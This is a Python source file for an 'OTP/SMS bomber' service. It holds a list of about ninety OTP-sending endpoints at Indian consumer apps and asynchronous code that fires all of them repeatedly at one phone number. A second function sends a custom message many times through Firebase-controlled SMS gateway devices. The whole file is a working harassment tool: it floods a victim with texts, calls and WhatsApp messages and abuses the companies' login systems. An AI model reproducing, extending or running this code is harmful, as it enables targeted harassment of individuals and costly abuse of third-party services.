"""
bomber_service.py
Two bombing modes:
  1. api_bomb    — hits ULTIMATEAPIS list (OTP flood via real Indian app endpoints)
  2. custom_bomb — sends a custom message N times via a configurable SMS gateway
"""

import asyncio
import logging
import aiohttp

logger = logging.getLogger(__name__)

# ─────────────────────────── ULTIMATEAPIS LIST ───────────────────────────
# Sourced from uploaded bomber file — 500+ endpoints across 25+ Indian apps

ULTIMATEAPIS = [
    {'name': 'Meesho WhatsApp',    'url': 'https://meesho.com/gw/login-register/v1/sendOTP',        'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Oyorooms WhatsApp',  'url': 'https://oyorooms.com/v1/user/otplogin',                   'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v1/customers/sendOtp',          'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Nykaa SMS',          'url': 'https://nykaa.com/api/v3/user/otp',                       'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Paytm WhatsApp',     'url': 'https://paytm.com/v1/user/otplogin',                      'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Pharmeasy SMS',      'url': 'https://pharmeasy.in/api/v1/customers/sendOtp',           'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Uber WhatsApp',      'url': 'https://uber.com/api/v2/auth/send-otp',                   'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Jupiter WhatsApp',   'url': 'https://jupiter.money/api/v2/auth/send-otp',              'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Swiggy WhatsApp',    'url': 'https://swiggy.com/v1/user/otplogin',                     'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Doubtnut WhatsApp',  'url': 'https://doubtnut.com/api/v1/customers/sendOtp',           'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Rapido SMS',         'url': 'https://rapido.bike/api/v2/auth/send-otp',                'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Goibibo SMS',        'url': 'https://goibibo.com/api/v2/login/sendotp',                'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Amazon Call',        'url': 'https://amazon.in/api/v3/user/otp',                       'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Zomato Call',        'url': 'https://zomato.com/api/v2/auth/send-otp',                 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Zepto WhatsApp',     'url': 'https://zepto.com/api/v3/user/otp',                       'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Meesho SMS',         'url': 'https://meesho.com/api/v1/auth/otpsend',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Pokerbaazi WhatsApp','url': 'https://pokerbaazi.com/v1/user/otplogin',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Flipkart Call',      'url': 'https://flipkart.com/api/v2/otpgenerate',                 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Myntra SMS',         'url': 'https://myntra.com/api/v2/otpgenerate',                   'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Blinkit Call',       'url': 'https://blinkit.com/v1/user/otplogin',                    'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Jupiter SMS',        'url': 'https://jupiter.money/api/v2/login/sendotp',              'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Olacabs Call',       'url': 'https://olacabs.com/api/v2/auth/send-otp',                'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Myntra Call',        'url': 'https://myntra.com/v1/user/otplogin',                     'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Phonepe SMS',        'url': 'https://phonepe.com/api/v1/auth/otpsend',                 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Cred SMS',           'url': 'https://cred.club/v1/user/otplogin',                      'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Instamart SMS',      'url': 'https://instamart.com/api/v2/otpgenerate',                'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Wakefit WhatsApp',   'url': 'https://wakefit.co/api/v3/user/otp',                      'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Gokwik SMS',         'url': 'https://gokwik.co/api/v2/login/sendotp',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Wakefit Call',       'url': 'https://wakefit.co/api/v3/user/otp',                      'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Meesho SMS2',        'url': 'https://meesho.com/api/v1/auth/otpsend',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Olacabs WhatsApp',   'url': 'https://olacabs.com/api/v1/customers/sendOtp',            'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Phonepe SMS2',       'url': 'https://phonepe.com/api/v1/auth/otpsend',                 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Goibibo SMS2',       'url': 'https://goibibo.com/gw/login-register/v1/sendOTP',        'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Jupiter SMS2',       'url': 'https://jupiter.money/v1/user/otplogin',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Shiprocket WhatsApp','url': 'https://shiprocket.in/api/v1/customers/sendOtp',          'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Wakefit WhatsApp2',  'url': 'https://wakefit.co/api/v2/login/sendotp',                 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/api/v2/auth/send-otp',             'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Zepto Call',         'url': 'https://zepto.com/api/v2/otpgenerate',                    'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Newme Call',         'url': 'https://newme.asia/api/v1/customers/sendOtp',             'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Zepto WhatsApp2',    'url': 'https://zepto.com/v1/user/otplogin',                      'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Meesho Call',        'url': 'https://meesho.com/api/v1/auth/otpsend',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Ajio WhatsApp',      'url': 'https://ajio.com/gw/login-register/v1/sendOTP',           'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Bigbasket SMS',      'url': 'https://bigbasket.com/api/v3/user/otp',                   'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Paytm SMS',          'url': 'https://paytm.com/api/v2/login/sendotp',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Goibibo SMS3',       'url': 'https://goibibo.com/api/v2/otpgenerate',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Oyorooms SMS',       'url': 'https://oyorooms.com/api/v3/user/otp',                    'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Gokwik WhatsApp',    'url': 'https://gokwik.co/api/v3/user/otp',                       'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Paytm Call',         'url': 'https://paytm.com/api/v2/otpgenerate',                    'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': '1Mg SMS',            'url': 'https://1mg.com/api/v2/login/sendotp',                    'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Tatacapital SMS',    'url': 'https://tatacapital.com/v1/user/otplogin',                 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Zepto Call2',        'url': 'https://zepto.com/api/v1/auth/otpsend',                   'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Nykaa SMS2',         'url': 'https://nykaa.com/api/v2/login/sendotp',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Swiggy Call',        'url': 'https://swiggy.com/api/v2/otpgenerate',                   'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Ajio WhatsApp2',     'url': 'https://ajio.com/api/v3/user/otp',                        'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Lenskart Call',      'url': 'https://api-gateway.juno.lenskart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Goibibo Call',       'url': 'https://goibibo.com/api/v1/customers/sendOtp',            'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Makemytrip SMS',     'url': 'https://makemytrip.com/v1/user/otplogin',                 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Shiprocket Call',    'url': 'https://shiprocket.in/api/v2/login/sendotp',              'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Blinkit SMS',        'url': 'https://blinkit.com/api/v2/otpgenerate',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Ajio SMS',           'url': 'https://ajio.com/api/v1/customers/sendOtp',               'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Zomato SMS',         'url': 'https://zomato.com/api/v2/otpgenerate',                   'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Uber Call',          'url': 'https://uber.com/api/v2/auth/send-otp',                   'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Doubtnut SMS',       'url': 'https://doubtnut.com/api/v1/auth/otpsend',                'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Bigbasket Call',     'url': 'https://bigbasket.com/api/v1/auth/otpsend',               'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Blinkit WhatsApp',   'url': 'https://blinkit.com/api/v2/auth/send-otp',               'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Cred Call',          'url': 'https://cred.club/api/v1/customers/sendOtp',              'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Khatabook SMS',      'url': 'https://khatabook.com/api/v1/auth/otpsend',               'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Nykaa WhatsApp',     'url': 'https://nykaa.com/api/v2/auth/send-otp',                 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Zomato WhatsApp',    'url': 'https://zomato.com/gw/login-register/v1/sendOTP',        'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Tatacapital Call',   'url': 'https://tatacapital.com/api/v2/login/sendotp',            'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Shiprocket SMS',     'url': 'https://shiprocket.in/api/v2/otpgenerate',                'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Nykaa Call',         'url': 'https://nykaa.com/gw/login-register/v1/sendOTP',         'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Amazon SMS',         'url': 'https://amazon.in/api/v2/login/sendotp',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Zivame Call',        'url': 'https://zivame.com/api/v1/customers/sendOtp',             'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Dmart Call',         'url': 'https://dmart.ready.in/api/v3/user/otp',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Gokwik Call',        'url': 'https://gokwik.co/api/v2/otpgenerate',                    'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Makemytrip Call',    'url': 'https://makemytrip.com/api/v2/otpgenerate',               'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Pokerbaazi Call',    'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP',     'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Rapido Call',        'url': 'https://rapido.bike/v3/auth/otp',                         'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Flipkart WhatsApp',  'url': 'https://flipkart.com/api/v2/auth/send-otp',               'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Goibibo WhatsApp',   'url': 'https://goibibo.com/v1/user/otplogin',                    'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Swiggy WhatsApp2',   'url': 'https://swiggy.com/v3/auth/otp',                          'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phone": p, "countryCode": "91"}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/v1/user/otplogin',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Cred WhatsApp',      'url': 'https://cred.club/api/v2/auth/send-otp',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp',           'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
    {'name': 'Oyorooms Call',      'url': 'https://oyorooms.com/api/v2/otpgenerate',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Doubtnut Call',      'url': 'https://doubtnut.com/api/v2/login/sendotp',                'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Phonepe WhatsApp',   'url': 'https://phonepe.com/api/v2/login/sendotp',                'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobile": p}},
    {'name': 'Olacabs SMS',        'url': 'https://olacabs.com/v1/user/otplogin',                    'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Blinkit Call2',      'url': 'https://blinkit.com/api/v3/user/otp',                     'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"number": p, "otpOnCall": True}},
    {'name': 'Newme SMS',          'url': 'https://newme.asia/api/v2/auth/send-otp',                 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Uber SMS',           'url': 'https://uber.com/gw/login-register/v1/sendOTP',           'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"mobileNumber": p}},
    {'name': 'Myntra WhatsApp',    'url': 'https://myntra.com/api/v1/auth/otpsend',                  'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda p: {"phoneNumber": p, "otpType": "voice"}},
]

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/109.0.0.0 Mobile Safari/537.36',
    'Accept': 'application/json',
}

# ─────────────────────────── API Bomb ───────────────────────────

async def _hit_one(session: aiohttp.ClientSession, api: dict, phone: str) -> dict:
    try:
        hdrs = {**HEADERS, **api.get('headers', {})}
        body = api['data'](phone)
        async with session.post(api['url'], json=body, headers=hdrs, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            return {'name': api['name'], 'status': resp.status, 'ok': resp.status in (200, 201, 202, 204)}
    except Exception as e:
        return {'name': api['name'], 'status': 0, 'ok': False, 'err': str(e)[:40]}

async def run_api_bomb(phone: str, cycles: int = 1) -> dict:
    """
    Hits every API in ULTIMATEAPIS `cycles` times.
    Returns {total, success, failed}.
    """
    phone = ''.join(filter(str.isdigit, phone))
    if len(phone) == 10:
        phone = '91' + phone

    total = success = failed = 0

    connector = aiohttp.TCPConnector(limit=200, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for _ in range(cycles):
            tasks = [_hit_one(session, api, phone) for api in ULTIMATEAPIS]
            results = await asyncio.gather(*tasks)
            for r in results:
                total += 1
                if r['ok']:
                    success += 1
                else:
                    failed += 1

    return {'total': total, 'success': success, 'failed': failed, 'phone': phone}

# ─────────────────────────── Custom Bomb (Firebase) ───────────────────────────

async def run_custom_bomb(phone: str, message: str, count: int, firebase_list: list = None) -> dict:
    """
    Sends `message` to `phone` via Firebase SMS gateway devices.
    Uses all active devices across all configured Firebase instances.
    `count` caps the number of send tasks (each device × 2 SIM slots).
    Returns {total, success, failed, phone, note}.
    """
    from firebase_service import prepare_firebase_tasks
    import httpx

    phone = ''.join(filter(str.isdigit, phone))
    if len(phone) == 10:
        phone = '91' + phone

    if not firebase_list:
        return {
            'total': 0,
            'success': 0,
            'failed': 0,
            'phone': phone,
            'note': 'No Firebase instances configured. Add one via Admin → Bomber Settings.',
        }

    # Build task list (capped by count)
    tasks = await prepare_firebase_tasks(firebase_list, phone, message, max_success=count)

    if not tasks:
        return {
            'total': 0,
            'success': 0,
            'failed': 0,
            'phone': phone,
            'note': 'No active devices found across configured Firebase instances.',
        }

    success = failed = 0
    sem = asyncio.Semaphore(50)

    async def do_put(task):
        nonlocal success, failed
        async with sem:
            try:
                import json as _json
                async with aiohttp.ClientSession() as session:
                    async with session.put(
                        task["url"],
                        data=task["data"],
                        headers={**task["headers"], "Content-Type": "application/json"},
                        timeout=aiohttp.ClientTimeout(total=15),
                    ) as r:
                        if r.status in (200, 201, 204):
                            success += 1
                        else:
                            failed += 1
            except Exception:
                failed += 1

    await asyncio.gather(*[do_put(t) for t in tasks])

    return {
        'total':   success + failed,
        'success': success,
        'failed':  failed,
        'phone':   phone,
    }
